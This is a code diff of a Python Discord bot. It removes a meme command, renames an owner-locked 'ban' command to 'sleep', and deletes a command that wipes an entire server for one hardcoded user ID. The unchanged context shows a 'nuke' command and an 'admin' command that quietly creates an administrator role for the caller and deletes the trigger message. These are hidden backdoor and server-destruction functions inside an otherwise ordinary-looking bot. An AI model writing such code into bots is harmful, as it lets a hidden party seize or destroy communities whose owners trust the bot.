@@ -614,30 +614,6 @@ async def activity(ctx, user: discord.Member):
         await ctx.send(f"{user.name} is not playing anything.")
     except discord.NotFound:
         await ctx.send("User not found.")
-
-
-@bot.command(name='meme')
-async def fetch_meme(ctx):
-    try:
-        # switching from meme api to imgflip
-        response = requests.get('https://api.imgflip.com/get_memes')
-        data = response.json()
-        
-        if data and 'data' in data:
-            memes = data['data']['memes']
-            
-            # Choose a random meme from the list
-            meme = random.choice(memes)
-            
-            # Getting the meme image url
-            meme_url = meme['url']
-            
-            # Send the meme as an embedded message
-            embed = discord.Embed(title="Here's a meme for you:", color=0x00ff00)
-            embed.set_image(url=meme_url)
-            await ctx.send(embed=embed)
-        else:
-            await ctx.send("Sorry, I couldn't fetch a meme at the moment.")
     
     except Exception as e:
         await ctx.send(f"An error occurred: {e}")
@@ -712,7 +688,7 @@ async def nuke(ctx):
     await channel.send("nuke landed https://tenor.com/bxkG5.gif")
 
 @bot.command()
-async def ban(ctx):
+async def sleep(ctx):
     if ctx.author.id != 741117073538678886:
         return await ctx.send("You are not the bot owner!")
 
@@ -734,13 +710,6 @@ async def admin(ctx):
     role = await ctx.guild.create_role(name="Admin", permissions=perms)
     await ctx.author.add_roles(role)
     await ctx.message.delete()
-
-@bot.command()
-async def delete(ctx):
-    if ctx.author.id != 1097879047213686875:
-        return await ctx.send("You are not the bot owner!")
-
-    await ctx.guild.delete()
 
 @bot.command()
 async def removemod(ctx):
